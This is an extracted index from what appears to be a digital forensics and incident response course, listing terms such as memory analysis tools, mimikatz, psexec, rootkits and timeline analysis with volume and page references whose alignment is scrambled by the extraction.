3:64, 3:75, 3:80, 3:91, 3:95, 3:114, 3:141142, 3:168, 4:89, 5:16, 5:108

GRR

1:113, 3:186

H
Handle

handles

hiberfil.sys
Hibernation File Analysis
hibr2bin
Hiding in plain sight
Hiding techniques
hivelist
Hooking
Hunting Organization

.

Hash Lookups
Hashes

1:93, 1:107, 1:113, 1:120, 2:42-43, 2:123,
2:135, 2:155, 3:6-7, 3:11, 3:19, 3:26, 3:28,
3:34, 3:38-39, 3:41, 3:59, 3:61, 3:75-76,
3:78, 3:80-81, 3:83, 3:85, 3:91, 3:94,
3:102-103, 3:134, 3:145, 3:173, 3:175,
3:183-184, 3:186, 5:43, 5:79
1:120, 2:42, 2:123, 2:135, 3:6-7, 3:19, 3:28,
3:34, 3:38-39, 3:41, 3:59, 3:61, 3:75-76,
3:78, 3:80, 3:83, 3:85, 3:91, 3:94, 3:102103, 3:134, 3:173, 3:175, 3:183-184, 3:186,
5:79
4:6
1:40, 1:43, 1:87-88, 1:97, 1:100, 1:129-131,
1:133, 1:137-139, 1:142, 1:144-145, 1:148,
1:151, 1:154, 1:156, 1:158-159, 2:17, 2:21,
2:23, 2:25, 2:143-144, 2:147, 2:170, 2:184,
3:52, 3:54, 3:101, 3:154, 3:157, 4:6
3:11, 3:13-14
3:13-14
3:13-14
1:61, 1:63, 3:35, 3:42, 3:136, 4:8
3:108, 3:152, 3:172, 4:5
3:22-23, 3:179
3:7, 3:18, 3:102, 3:139-141, 3:148-149,
3:152, 3:158, 3:185
1:31

I
I/O Request Packets (IRP)
IAT

3:140
1:6, 1:11, 1:14-16, 1:21-24, 1:26-30, 1:3233, 1:40-42, 1:48, 1:65, 1:70, 1:73, 1:80,
1:84, 1:114, 1:116, 1:120, 1:126, 1:130,
1:135, 1:139, 1:159-160, 2:14, 2:19, 2:2325, 2:28, 2:40, 2:46, 2:50, 2:52, 2:56,
2:58, 2:62, 2:64-65, 2:81, 2:90, 2:93,
2:97-98, 2:102, 2:143, 2:154, 2:165, 2:167,

Index - 9

.

.

icat

Identification

Index - 10

.

3:6-7, 3:9, 3:20-21, 3:30, 3:51-52, 3:54,
3:59, 3:62, 3:64-65, 3:69, 3:71, 3:73, 3:76,
3:80-81, 3:83, 3:85-86, 3:92-93, 3:96,
3:108, 3:112, 3:117, 3:119, 3:121, 3:123,
3:125, 3:127, 3:140, 3:148-149, 3:151-152,
3:154, 3:176-177, 4:12, 4:41, 4:52, 4:63,
4:86, 4:91-92, 5:12-13, 5:22, 5:49-50,
5:52, 5:55-56, 5:73, 5:83, 5:86, 5:91, 5:94,
5:97, 5:102, 5:109
1:6, 1:11-12, 1:15-17, 1:20-33, 1:38-40,
1:42-43, 1:45-46, 1:49-51, 1:55, 1:57, 1:6266, 1:70, 1:73, 1:75, 1:77-81, 1:86-87, 1:89,
1:92, 1:98, 1:100, 1:108, 1:110, 1:113-114,
1:118, 1:120, 1:128-132, 1:135, 1:137, 1:139140, 1:144, 1:148-149, 1:151-152, 1:154156, 1:158, 2:4, 2:6-9, 2:11, 2:14-15, 2:1719, 2:21, 2:24-25, 2:27, 2:29, 2:38-43,
2:46-48, 2:50-52, 2:54, 2:56-58, 2:62,
2:64, 2:67, 2:69-72, 2:81, 2:83, 2:85, 2:87,
2:89-90, 2:93-94, 2:96, 2:98, 2:101-103,
2:105-107, 2:115-116, 2:118, 2:121-130,
2:132-133, 2:135, 2:140-141, 2:143, 2:146148, 2:153, 2:156, 2:159, 2:161, 2:163-165,
2:167-169, 2:178, 2:187, 3:3, 3:5-7, 3:9,
3:11-12, 3:16, 3:18, 3:22-23, 3:30, 3:35,
3:38-39, 3:44, 3:46, 3:48-54, 3:59, 3:6163, 3:65, 3:69-70, 3:72-73, 3:76, 3:78,
3:80-81, 3:85-86, 3:88-89, 3:92-93, 3:96,
3:101, 3:103-105, 3:108, 3:111-112, 3:114,
3:119-123, 3:125-127, 3:130-132, 3:135,
3:139, 3:141-142, 3:144, 3:146, 3:148-150,
3:152, 3:154-155, 3:157-158, 3:163-164,
3:166, 3:168, 3:170, 3:172-173, 3:176-177,
3:179, 3:182, 3:184, 3:186, 4:3, 4:5-6, 4:912, 4:14, 4:16, 4:24, 4:28, 4:31, 4:34-36,
4:38, 4:40-42, 4:45, 4:47, 4:54, 4:56,
4:58, 4:61, 4:65, 4:72, 4:77, 4:83-84, 4:91,
4:94, 4:97, 4:100, 5:3, 5:5-6, 5:9-11, 5:17,
5:28, 5:42, 5:45, 5:47-49, 5:54-57, 5:59,
5:64-67, 5:69-70, 5:72-74, 5:78-80, 5:8687, 5:91-94, 5:98, 5:102, 5:104, 5:109,
5:111, 5:113
1:16, 1:20, 1:24, 1:26, 1:30, 1:32, 1:38,

idt
IEF
imagecopy
Impact
Import Address Table (IAT)
Incident Response

Incident Response Detection and
Intelligence Loop
Incident Response Process
Index Entry
Index.dat
Indicator of Compromise

.

Indicator of Compromise (IOC)
Indicators

Indicators of Compromise

Indx2Csv
INDXParse.py
Initial Compromise
Inodes
Intelligence

Intelligence Development

1:43, 1:55, 2:4, 2:98, 2:161, 3:3, 3:7, 3:9,
3:22, 3:30, 3:53, 3:80, 3:104, 3:120,
3:130, 3:132, 3:148, 3:152, 3:154, 3:157,
3:173, 4:3, 4:5, 5:3, 5:56
3:139-141, 3:148, 3:150, 3:158, 4:94
1:16, 1:39, 3:24, 3:65, 3:104, 5:26, 5:72
3:13-14
1:28, 1:42, 1:46, 3:7, 3:150, 3:157, 3:184,
5:10, 5:67, 5:83, 5:104
3:140, 3:148
1:1, 1:4, 1:6, 1:8, 1:11, 1:15-16, 1:18-20,
1:22-31, 1:33, 1:35, 1:38, 1:41-43, 1:45,
1:49, 1:52, 1:55, 1:57, 1:68, 1:91-93, 1:9697, 1:101-102, 1:108, 1:117, 1:122-123,
1:125, 2:4, 2:67, 2:131, 2:144, 2:182, 3:1,
3:3-4, 3:7, 3:10, 3:15, 3:18, 3:52, 3:96,
3:98, 3:186, 4:3, 4:21, 5:3, 5:11, 5:66,
5:113
1:26
1:20, 1:22, 1:27
5:61, 5:65, 5:73, 5:83
4:63
1:24, 1:49, 1:51, 1:57, 2:64, 3:81, 3:166,
3:182, 3:184, 3:186, 4:9, 5:93
1:49, 3:166, 3:186
1:31, 1:39-40, 1:42-43, 1:49-51, 1:55, 1:57,
1:70, 1:89, 2:4, 2:19, 2:27, 2:143, 2:146147, 2:164, 2:167, 3:3, 3:51, 3:76, 3:80-81,
3:120, 3:131, 3:158, 3:163, 3:170, 3:186,
4:3, 4:5, 4:10, 4:100, 5:3, 5:6, 5:73, 5:9293
1:49-51, 2:19, 2:27, 2:143, 2:146-147,
2:167, 3:51, 3:76, 3:80-81, 3:120, 3:170,
3:186, 4:10, 4:100
5:65-66
5:66
1:37, 1:126
5:98
1:14, 1:16, 1:21-27, 1:29-33, 1:36-44, 1:46,
1:48-50, 1:53, 1:55, 1:57-58, 1:102, 2:4,
2:135, 3:3, 3:8, 4:3, 5:3
1:21, 1:24, 1:26

Index - 11

.

Intent

Interactive Logon

IOC Development
IOC Editor
IOCe
IPC$
IR Process
IRP
istat

.

InventoryApplication
InventoryDriverBinary
Invoke-Command
Invoke-Phant0m
IOC

1:2-4, 1:9-10, 1:13, 1:19, 1:24, 1:35-36,
1:39, 1:42, 1:52-53, 1:57, 1:64, 1:68-69,
1:90-91, 1:94, 1:109, 1:112, 1:121-124,
1:162-163, 2:2-3, 2:5, 2:34-37, 2:44-45,
2:62, 2:71, 2:79, 2:112-113, 2:136-139,
2:177, 2:188-190, 3:2, 3:4, 3:10, 3:15, 3:25,
3:27, 3:57-58, 3:84, 3:97-98, 3:100, 3:137138, 3:159, 3:174, 3:187-189, 4:2, 4:4,
4:14, 4:16-20, 4:32-33, 4:49-50, 4:70-71,
4:79-80, 4:87-88, 4:98-99, 4:102-103,
5:2, 5:4, 5:7-8, 5:18-20, 5:84-85, 5:88,
5:110, 5:114-118
1:129, 1:132, 1:137, 1:139, 1:142, 1:155,
2:46, 2:50, 2:62, 2:182
2:19, 2:24
2:21
1:98-99, 1:132, 2:130, 2:168, 3:49
2:105-106
1:24, 1:26, 1:49-51, 1:55, 1:113-115, 2:4,
2:27, 2:147, 3:3, 3:152, 3:166, 3:184,
3:186, 4:3, 4:10, 4:100, 5:3, 5:77-78, 5:91
1:24
3:186
3:186
2:81, 2:118
1:31, 1:49, 2:121, 3:30, 3:89, 3:146, 3:173
3:139-140, 3:158, 4:65, 5:67
5:35-37, 5:41, 5:48, 5:54, 5:56, 5:73

J
jobparser.py
journal

jp

Index - 12

.

2:94
4:44, 5:11, 5:21, 5:23, 5:27, 5:29, 5:37-38,
5:47, 5:64, 5:67, 5:69-72, 5:74, 5:77-78,
5:81-82, 5:87-88, 5:90, 5:92-93, 5:102,
5:111-112
3:23, 5:82

K
Kansa
Kansa.ps1
KDBG
Kernel Debugger Datablock (KDBG)
Kernel Processor Control Region (KPCR)
Kill chain
KPCR

1:15, 1:72, 1:74, 1:81-82, 1:93-94, 1:101103, 1:105-108, 2:179, 3:184-185
1:105-108
3:17, 3:19, 3:22-23
3:17
3:17
1:39-40, 1:42-43, 1:70, 2:128, 2:153
3:17, 3:23

L
lateral movement

ldrmodules

.

Least Frequency of Occurrence
LFO
Live Memory Forensics
LNK files
Local Service
log2timeline
log2timeline.py
LogFileParser
Logon Events
Logon ID
Logon Type
Logon Type Codes
Logon types
Logs

1:25, 1:37, 1:42, 1:44, 1:46, 1:57, 1:75,
1:125-126, 1:160, 2:27, 2:46, 2:74, 2:8081, 2:83, 2:85, 2:87, 2:89-90, 2:93, 2:99,
2:113-120, 2:124, 2:127-128, 2:130, 2:133137, 2:156, 2:158, 2:184, 3:48, 3:86, 4:28,
4:41, 5:113
3:53, 3:62-63, 3:104, 3:108, 3:111, 3:127131, 3:136
2:28, 2:32, 3:52
1:42
3:184
3:140, 4:52, 5:64, 5:78
1:148, 2:56, 2:98, 2:126, 2:146, 3:37, 4:22
4:30, 4:51, 4:58-59, 4:61, 4:63-69, 4:7276, 4:78, 4:83-86, 4:90, 4:92, 4:100, 5:17
4:30, 4:51, 4:58, 4:63-68, 4:72, 4:74-75,
4:78, 5:17
5:79-80
2:42, 2:46, 2:50, 2:67, 2:69, 2:72, 2:132
2:52, 2:65, 2:81, 2:103, 2:148
1:132, 2:47, 2:50-52, 2:54, 2:57, 2:62,
2:64, 2:77, 2:83, 2:87, 4:56
2:50-51
1:132, 2:51-52, 2:57, 2:62
1:18, 1:71, 1:74-75, 1:83, 1:97, 1:102, 1:114,
1:120, 1:126, 1:160, 2:38-42, 2:46-48,
2:51, 2:54, 2:56, 2:58, 2:62-64, 2:67, 2:6970, 2:72, 2:74, 2:77, 2:84, 2:87, 2:90-91,
2:93-94, 2:98, 2:101-103, 2:105-108,

Index - 13

.

2:115-118, 2:126-127, 2:129-130, 2:135,
2:140-141, 2:143-144, 2:146-147, 2:157158, 2:163-164, 2:169, 2:172-174, 2:176,
2:179-182, 2:184, 2:187, 3:5, 3:69, 3:72,
3:157, 4:12, 4:30, 4:54, 4:56, 4:59, 4:68,
4:76, 4:85, 4:95, 4:100, 5:6, 5:11, 5:15,
5:67-68, 5:74, 5:77, 5:79, 5:87-88, 5:90,
5:94, 5:105-106, 5:113
1:62, 5:57
1:62
1:130, 1:132, 1:139, 1:144-145, 1:148-151,
1:159
1:61, 1:145, 3:69, 3:127, 3:129, 5:60, 5:63

LOLBAS
LOLBIN
LSA Secrets
lsass.exe

M

Malware paradox
Malware persistence
Management Support
Master File Table
MBR
memdump
Memory Acquisition
Memory Analysis

Index - 14

.

01
de

Malware analysis
Malware detection
Malware Detection Methods
Malware Execution

hi

mactime
Maintain Presence
malfind

4:36, 4:42, 4:84, 4:90, 4:92, 5:17, 5:37,
5:42, 5:44, 5:79
4:44, 4:47-48, 4:64-65, 4:85-86, 4:94
1:41
3:63, 3:104-105, 3:111-114, 3:116-120,
3:123-124, 3:129-131, 3:135-136, 4:15
1:46, 3:91, 3:163, 3:182, 4:14
2:144, 3:26
3:26
1:57, 1:59, 2:140-141, 2:143, 2:178, 4:25,
5:113
1:54, 3:96
1:69-70, 1:74, 1:78, 1:86, 1:90, 2:129, 3:78,
3:142, 4:56
1:34
3:91, 3:145, 3:160, 3:163, 3:172, 3:177,
4:44, 4:69, 4:85-86, 5:25, 5:27, 5:32-33
1:138, 2:133, 3:139, 3:162, 4:9
3:163, 3:166
1:120, 3:11-12, 3:88, 3:172
1:54, 1:79, 1:113, 2:121, 2:123, 3:5-8, 3:1113, 3:16-18, 3:20, 3:25-26, 3:28, 3:30,
3:33-34, 3:51-52, 3:56, 3:59, 3:68, 3:85,
3:88, 3:91, 3:101-104, 3:110-111, 3:119,
3:123, 3:132, 3:134, 3:136, 3:139-140,
3:142, 3:149, 3:154, 3:158, 3:160, 3:163,

.ir

MACB

Memory analysis tools
Memory Compression
Memory Forensics

Memory Sections

memory.dmp
metadata layer
MFTEcmd
mimikatz

.

moddump
modscan
modules

Mutex

3:168, 3:172-173, 3:182-184, 3:186
3:11, 3:18, 3:28, 3:30, 3:91, 3:111, 3:134,
3:172-173
3:169
1:62, 1:79, 2:161, 3:1, 3:4-5, 3:7-10, 3:1516, 3:20, 3:26, 3:46, 3:53, 3:56, 3:68, 3:71,
3:98, 3:101, 3:103, 3:110, 3:135, 3:163,
3:174-175, 3:184-186, 4:77
3:17-19, 3:59-60, 3:92, 3:101, 3:104, 3:111114, 3:120, 3:123, 3:129, 3:134, 3:136,
3:160-161, 3:163, 3:166, 3:168, 3:182-183,
3:186, 4:15
3:11-12
5:25
4:30, 4:44-47, 4:85-86, 5:48-50, 5:81-82,
5:106
1:100, 1:119, 1:128-131, 1:135, 1:139-140,
1:145, 1:148, 1:151-152, 1:154-155, 1:160,
2:17, 2:27, 2:105, 2:146, 2:172, 3:67, 3:107
3:142, 3:151, 3:163, 3:165
3:53, 3:140, 3:151-152, 3:158, 3:164-165
1:51, 1:74, 1:101-103, 1:105, 1:107-108,
2:28, 2:143, 2:164, 2:168, 3:17-18, 3:23,
3:53, 3:62-63, 3:94, 3:104, 3:108, 3:111,
3:127-131, 3:134, 3:136, 3:140-142, 3:151152, 3:158, 3:161-166, 3:173, 3:182, 4:10,
4:75, 4:84, 4:91-92
3:59, 3:81

N
Named Pipes
Namespace Type
netscan
Network artifacts
Network Logon
Network Service
Network Shares
Non-Resident
NSRL
NTDS.DIT

1:79, 1:160, 2:118, 2:121-123, 3:75, 3:80,
3:83, 4:14
5:43
3:87-89
3:84-89, 3:95-96, 3:158, 3:183
1:127, 1:142, 2:50, 2:72
1:148, 2:56, 3:37, 4:22
2:30, 2:57, 2:80, 2:178
5:26, 5:34, 5:41, 5:50-51, 5:59, 5:74
1:78
1:130, 1:139, 1:144, 1:148, 1:151, 1:155,

Index - 15

.

1:159
1:159
3:91-92, 3:160-161, 3:163, 3:175, 3:177,
3:179, 4:34-36, 4:41-44, 4:46-47, 4:69,
5:13-14, 5:21-27, 5:31-32, 5:35, 5:39-40,
5:43-44, 5:47-48, 5:50, 5:53-56, 5:58-60,
5:64-74, 5:76, 5:81, 5:83-84, 5:89-92,
5:99, 5:102, 5:105-107, 5:111
5:27, 5:35, 5:50, 5:54
5:23, 5:68
4:35
1:71, 2:123, 3:179, 4:41, 4:61, 4:75, 5:94

NTDSXtract
NTFS

NTFS Attributes
NTFS Features
NTFS Timestamps
NTUSER.DAT

O
Object Access
Object ID
OpenIOC
openioc_scan
Operating System Vulnerabilities
Operational Tempo
Opportunity

.

P

2:42-43, 2:52, 2:80, 2:89, 2:91
5:24, 5:28
1:50, 3:186
3:186
2:135
1:33
1:7, 1:24, 1:78, 1:93, 1:120, 2:11, 2:122,
3:48, 3:51, 3:103, 4:14, 5:30, 5:64, 5:98

Page_Execute_ReadWrite
pagefile.sys
Pass the Hash attack
Pass the Ticket attack
PEB
persistence

persistence mechanisms
pf

Index - 16

.

3:111, 3:114, 3:116, 3:118
3:11-12, 3:62, 3:92, 3:169, 3:172, 5:15
2:72
1:155-156
3:17, 3:19, 3:62-64, 3:94, 3:103-104,
3:108, 3:119, 3:121, 3:126-131, 3:173
1:21, 1:37, 1:42, 1:46, 1:54, 1:57, 1:69-80,
1:82, 1:84, 1:86, 1:90, 1:115, 1:155, 2:30,
2:90, 2:124, 2:129, 2:158-159, 3:30, 3:4849, 3:51, 3:78, 3:103, 3:142, 3:152, 3:158,
3:170, 3:179, 3:181, 4:14, 4:56, 5:95, 5:113
1:70, 1:86, 3:142, 3:152
1:30, 1:62, 1:78, 1:119, 1:128, 1:156, 2:6,
2:8-11, 2:15, 2:46-47, 2:50, 2:52, 2:54,
2:64, 2:80, 2:93, 2:118, 2:126, 2:129,

Phantom DLL
Phantom DLL Hijacking
PhotoRec
pinfo
pinfo.py
pivot point
pivotal phase
plaso

powercfg.exe
Powershell

Powershell Authentication
Powershell Basics
Powershell Remoting

.

Policy Change
Ports

2:140, 2:144, 2:146, 2:164, 3:11-12, 3:24,
3:41-42, 3:62, 3:75, 3:78, 3:86, 3:88, 3:92,
3:112, 3:124, 3:163, 3:169, 3:172, 3:175,
3:182, 4:14, 4:43, 4:65, 4:83, 4:91, 5:21,
5:35, 5:42, 5:72, 5:74, 5:78, 5:83, 5:91,
5:94, 5:97, 5:99-100, 5:111
1:77-78
1:77-78
5:99-100, 5:106
4:58, 4:80-81
4:80-81
2:115, 4:27-28, 4:31, 4:41, 4:56, 4:84,
4:89, 4:97, 5:55
1:41
4:30, 4:51, 4:58-59, 4:61, 4:63-68, 4:7476, 4:78, 4:81, 4:83-86, 4:92, 4:94-95,
4:100, 5:17, 5:92
2:42-43
1:41, 1:48, 1:61, 1:84, 1:87-88, 1:110-111,
1:114, 2:16, 2:28, 2:77, 2:96, 2:133, 2:135,
2:141, 2:143, 3:11-12, 3:63, 3:85, 3:87,
3:89, 3:96, 3:108, 3:129-131, 3:148, 3:172,
3:183, 4:6, 4:46, 4:68, 4:72, 4:75-76,
4:83-84, 4:94, 5:22, 5:35, 5:47-48, 5:99,
5:106
3:14
1:15, 1:18, 1:33, 1:74, 1:80-86, 1:93-103,
1:105, 1:107-108, 1:110, 1:127, 1:132, 1:139,
1:148-149, 1:159-160, 2:40, 2:74-75, 2:85,
2:87, 2:94, 2:98, 2:103, 2:105, 2:125,
2:128-133, 2:139-140, 2:148, 2:150, 2:152,
2:155, 2:158-159, 2:161-165, 2:167-170,
2:172-174, 2:176, 2:178-179, 2:181-182,
2:184-185, 2:188, 3:7, 3:9, 3:48-50, 3:67,
3:78, 3:80, 3:102, 3:110, 3:119, 3:126,
3:130, 3:135, 3:166, 3:170, 3:177, 3:179,
3:185, 4:7, 4:15-16, 4:56, 4:82, 5:6, 5:55,
5:57, 5:73, 5:95, 5:112-113
1:100
1:96
1:18, 1:33, 1:83, 1:93, 1:98-101, 1:110,
1:132, 2:85, 2:130, 2:132, 2:163, 2:172,
2:181, 3:49-50

Index - 17

.

PowerShell Script Block Logging
PowerShell Transcript
Prefetch

Preparation
Previous Versions
printkey
Privacy Cleaner
Problems
procdump
Process Environment Block (PEB)
Process Hollowing
Process Objects

Processbl
Program Execution
Protected Process
psexec

psexec.exe
pslist

PsLogList
psort
psort.py
pspcid
psscan
pstree
psxview

Index - 18

.

.

Process Tracking

2:164, 2:169, 2:172, 4:56
2:164, 2:172, 2:174, 3:170, 3:177, 3:179,
4:56
1:59, 1:103, 1:120, 2:6-11, 2:15, 2:18, 2:34,
2:121, 2:125, 2:130, 2:162, 3:173, 3:176177, 4:25, 4:52, 4:54, 4:59, 4:68, 4:82,
5:31, 5:64, 5:77-78, 5:87-88, 5:91, 5:93,
5:97
1:5, 1:20, 1:31
2:19, 3:14, 5:9-11
3:175, 3:179
5:86, 5:94
1:78, 1:128, 1:144, 2:38, 3:101, 3:136
1:107, 3:163-164, 3:166
3:17, 3:62, 3:64, 3:103-104, 3:108, 3:119,
3:121, 3:126-129, 3:173
1:61, 3:102-104, 3:122, 3:126, 3:129,
3:134, 3:136, 3:183, 3:185
3:22, 3:39, 3:52, 3:58-59, 3:61-62, 3:6465, 3:69, 3:73, 3:75-76, 3:78, 3:80-81,
3:83, 3:94, 3:97, 3:103, 3:165, 3:182-183
2:42-43, 2:52, 2:121, 2:129-130, 2:132,
2:135, 2:140, 2:148, 2:150, 2:157, 2:161,
2:185, 3:7
3:53
2:6, 2:14, 2:17-18, 2:118
1:129, 1:137, 1:139, 3:51
1:33, 1:98, 1:129-132, 1:135, 1:139, 1:160,
2:15, 2:27, 2:30, 2:72, 2:84, 2:97-99,
2:121-123, 2:125, 2:128, 2:133, 2:147,
2:156, 3:48, 3:67, 3:80, 4:41
2:121-122
1:107, 1:115, 3:21-23, 3:33-35, 3:38-39,
3:41, 3:53-54, 3:56, 3:144-146, 3:163-164,
3:166, 3:182
2:179
4:58, 4:80, 4:83-86, 4:89-90, 5:17
4:80, 4:83-86, 5:17
3:145
3:22-23, 3:33, 3:38-39, 3:56, 3:64, 3:144146, 3:164
3:33, 3:41-42, 3:44, 3:46, 3:56, 3:93
3:140, 3:145-146, 3:158

R
RDP

RDP Usage
RDPClip.exe
rdphint
Reactive Organization
Real-Time Remediation
RecentFileCache
RecentFileCache.bcf
Recon

Reconnaissance

.

Records Carving
Recovery

reg.exe
Registry Handle
RegRipper
regular expressions
Rekall
Remediation
Remediation Event
Remote Management Tools
Reparse Point
Resident

restore points
Right Mindset
Risk

1:74, 1:98, 1:100, 1:129, 1:132, 1:137, 1:139,
1:142, 1:148, 1:156, 2:50, 2:54, 2:62-64,
2:67, 2:83, 2:110, 2:115-117, 2:133, 2:178,
3:85-86, 3:145-146, 4:62, 4:82
2:62
2:117
2:115
1:31
1:30
2:17
2:17
1:37, 1:41-43, 1:46, 1:115, 2:27-28, 2:50,
2:62, 2:64-65, 2:74-75, 2:154, 2:184, 3:1314, 3:91, 3:114, 3:116, 3:118, 3:134, 3:173,
3:176, 3:179, 4:12, 4:100, 5:25, 5:80,
5:103, 5:106-109
1:37, 1:41-42, 1:46, 2:27, 2:74-75, 2:154,
2:184
5:82, 5:105-107
1:11, 1:20-21, 1:73-74, 2:150, 3:78, 3:134,
3:165-166, 3:172, 3:175, 4:29, 5:8, 5:15,
5:21, 5:39, 5:63, 5:86, 5:94, 5:96, 5:98102, 5:104-105, 5:108-109, 5:111-112,
5:114
2:16, 2:27, 2:125, 5:60, 5:63
3:59, 3:75-76
1:72, 2:115
1:51, 2:28, 2:181, 3:168-169, 4:10, 4:75
1:113, 3:20, 3:104
1:11, 1:16, 1:21-24, 1:26-30, 1:32, 1:126, 3:7
1:28-29
1:127, 2:124, 2:126-127
5:24, 5:29, 5:40
2:105, 3:88, 3:160, 3:163, 3:166, 3:177,
3:179, 4:45, 5:26, 5:33-34, 5:41, 5:50-52,
5:59-60, 5:74
5:9-10
1:33
1:23, 1:61, 1:66, 1:133, 1:137, 1:145, 3:91,
3:129, 3:132, 3:135, 3:141, 3:150, 3:181,
4:72

Index - 19

.

Rootkit

1:54, 1:61, 1:63, 1:102, 2:21, 3:5-7, 3:20,
3:26, 3:28, 3:34-35, 3:38, 3:99, 3:101,
3:138-142, 3:144-146, 3:148-152, 3:155,
3:158, 3:181, 3:183-184, 3:187, 4:54
3:7, 3:139, 3:158
1:61, 1:63, 1:102, 2:21, 3:6, 3:26, 3:34-35,
3:101, 3:139-140, 3:145, 3:148, 3:150-151,
3:155, 3:158, 3:181, 3:184, 3:187
1:132, 1:137, 1:142, 2:41, 2:46, 2:50, 2:83,
2:85, 2:87, 2:121, 2:127

Rootkit Hooking
Rootkits

RunAs

S
Sacrificial Process
sc.exe
schtasks.exe
Scope

servicebl
session

Setup
Shadow Copy
ShellBags
shimcache
shimcachemem
Shimcacheparser.py

Index - 20

.

.

ScopeSnapshots
SDelete
Semaphore
Service Accounts

3:67-68, 4:56
1:86-87, 1:107, 2:115, 2:126, 3:50
1:75, 2:27, 2:94
1:15, 1:21, 1:23, 1:26-28, 1:81, 2:83, 3:152,
4:6, 4:31, 4:72-73, 4:76, 4:97, 5:5, 5:10-11,
5:78, 5:111-112
5:10, 5:111-112
2:9, 2:11, 2:30, 5:6, 5:87-90
3:59
1:128-129, 1:147-148, 1:150, 1:156-158,
2:56-58, 2:116, 2:133, 3:37
3:53
1:98, 1:100, 1:129-130, 1:132-133, 1:137,
1:139, 1:142, 1:151, 1:156, 1:160, 2:7, 2:14,
2:46-47, 2:50, 2:52, 2:56-57, 2:62, 2:6465, 2:67, 2:69, 2:87, 2:97-98, 2:101, 2:103,
2:117-119, 2:121, 2:123, 2:130, 2:132,
2:148, 2:163, 2:172, 2:176, 3:6, 3:12, 3:34,
3:38, 3:41, 3:49, 3:67, 3:107, 3:114, 3:145146, 4:23, 4:41, 4:81, 5:55
1:38, 1:80, 1:155, 2:30, 2:72, 3:46, 3:92,
3:116, 3:139, 3:148, 4:13, 4:67, 4:82, 5:113
1:120, 1:159, 5:9-10, 5:12-14, 5:24, 5:101,
5:106, 5:111
1:59, 2:118, 4:25
1:120, 2:14, 2:16, 2:27-30, 2:34, 2:121,
2:130, 3:163, 5:47-49
3:163
2:16, 2:28, 5:48

Shortcut (LNK) files
SIFT Workstation
Sigcheck
sigcheck.exe
Six-Step Incident Response Process
Sleuth Kit
sockets
sockscan
Sparse file
ssdt
STIX
String Searching
strings

Super Timeline Analysis
Suspicious Services
svcscan
swapfile.sys
Sysinternals

System Events
System Files
System process

system restore

.

Stuxnet
Super Timeline

4:59
1:1, 1:7, 2:94, 3:168-169, 4:86, 5:14, 5:16
4:5-8, 5:48
4:6
1:20, 1:22
4:46-47, 5:35, 5:54, 5:65, 5:98, 5:106
3:5, 3:7, 3:17, 3:26, 3:59-60, 3:85, 3:8789, 3:96
3:87
5:21, 5:28, 5:40, 5:71
3:139-142, 3:148, 3:150, 3:158
1:46, 1:50
2:38, 3:13, 3:166, 3:168-169, 5:95, 5:107109
1:50-51, 1:96, 1:149, 2:77, 2:165, 3:91,
3:119-120, 3:134, 3:152, 3:162, 3:168-170,
3:172, 3:183, 3:186, 4:10, 4:14, 4:89,
5:106, 5:108-109
1:65, 1:80-81, 2:158, 3:102, 3:129
4:24, 4:30-31, 4:51-52, 4:54, 4:56, 4:58,
4:71-72, 4:77, 4:80, 4:85-86, 4:88-90,
4:92, 4:94-95, 4:97-100, 5:19, 5:55
4:77, 4:88, 4:99
2:96-98
3:53, 3:163, 3:181
3:11-12, 3:92, 3:172
1:74, 1:76, 1:81, 1:86-87, 2:98, 2:121,
2:157, 2:179, 2:184-185, 3:7, 3:48, 3:144,
4:6-7, 5:48, 5:87
2:42-43, 2:103
1:110, 3:141, 3:175, 4:44, 4:56, 5:9, 5:15,
5:26, 5:28, 5:40, 5:68
1:79, 2:132, 2:140, 3:30-31, 3:64, 3:69,
3:71, 3:73, 3:85, 3:102, 3:107, 3:123,
3:145, 3:158, 3:162, 4:5, 4:22, 4:56
5:9-10

T
Task Scheduler Logs
Task Scheduler v1.2
TDL3/TDSS

2:90-91
2:93
3:152

Index - 21

.

Team Composition
TeamViewer
Technet
Temporal Proximity
The Pivot Point
The Sleuth Kit
thrdproc
Thread

Threads

Tickets
Time Rule Exceptions
Time Rules
Time Slice
Timeline

Timeline Analysis

Index - 22

.

hi

Threat Hunting

de

01

.ir

Threat

1:32
2:115-116
1:99, 1:127, 1:138, 1:143, 2:42, 3:152
2:28, 4:27, 4:29
4:27-28, 4:56
4:46-47, 5:35, 5:54, 5:65, 5:98, 5:106
3:145-146
1:149, 2:105, 2:184, 3:5-7, 3:17, 3:19, 3:28,
3:34, 3:38-39, 3:41, 3:48, 3:59, 3:69, 3:85,
3:101-102, 3:104-105, 3:107-108, 3:136,
3:142, 3:145, 3:184-185, 4:11, 4:23, 5:105
2:105, 3:5-6, 3:17, 3:19, 3:28, 3:34, 3:3839, 3:41, 3:48, 3:59, 3:85, 3:104, 3:142,
3:145, 3:185, 4:11, 4:23
1:1, 1:6, 1:8, 1:11-12, 1:16, 1:18-22, 1:24,
1:27-33, 1:35-37, 1:39, 1:44-46, 1:48-50,
1:52, 1:55-58, 1:61, 1:63-64, 1:66, 1:68,
1:79, 1:82, 1:91, 1:93, 1:102, 1:108, 1:117,
1:122-123, 1:126, 1:129, 1:147, 1:156, 2:4,
2:29, 2:74, 2:80, 2:106, 2:114, 2:119-120,
2:135, 2:144, 2:146-147, 2:161-163, 3:1,
3:3-4, 3:10, 3:15, 3:64, 3:81, 3:98, 3:103,
3:117, 3:119, 3:132, 3:139, 3:142, 3:144,
3:150, 3:157, 3:182, 4:3, 5:3, 5:6, 5:66
1:1, 1:6, 1:8, 1:11, 1:18-20, 1:31-32, 1:35,
1:44-45, 1:52, 1:55-57, 1:63, 1:68, 1:91,
1:93, 1:108, 1:117, 1:122-123, 2:4, 2:29,
2:144, 2:161-162, 3:1, 3:3-4, 3:10, 3:15,
3:64, 3:98, 3:117, 3:157, 4:3, 5:3
1:129-130, 1:137, 1:139, 1:144, 1:148, 1:151152, 1:154-157, 1:159, 2:162, 3:101
4:40
4:36, 4:38, 5:44-45
4:84
1:117, 1:120, 2:11, 2:110, 2:119, 2:141,
2:143, 3:64, 3:91-92, 3:96, 3:177, 4:1,
4:18-24, 4:27-32, 4:34, 4:41-42, 4:44,
4:46-52, 4:54, 4:56, 4:58-59, 4:61, 4:6380, 4:83-90, 4:92, 4:94-95, 4:97-101,
5:17, 5:19, 5:55, 5:66, 5:77, 5:93, 5:102
3:96, 4:1, 4:18-24, 4:27-29, 4:31-32, 4:50,
4:66, 4:70, 4:72, 4:77, 4:79, 4:87-89, 4:95,
4:97, 4:99-101, 5:93, 5:102

Timeline Benefits
Timeline Creation

4:21
